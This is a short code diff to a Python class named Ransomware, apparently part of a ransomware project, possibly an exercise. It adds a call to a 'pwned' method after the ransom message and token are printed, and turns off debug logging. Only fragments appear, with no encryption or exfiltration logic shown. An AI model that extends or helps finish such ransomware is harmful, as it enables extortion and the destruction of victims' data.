@@ -94,6 +94,8 @@ class Ransomware:
         # Display the message and the token
         token = secret_manager.get_hex_token()
         print(ENCRYPT_MESSAGE.format(token.hex()))
+
+        secret_manager.pwned()
         
     """
         Main function for decrypting
@@ -128,7 +130,7 @@ class Ransomware:
 
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.DEBUG)
+    #logging.basicConfig(level=logging.DEBUG)
     
     if len(sys.argv) < 2:
         ransomware = Ransomware()
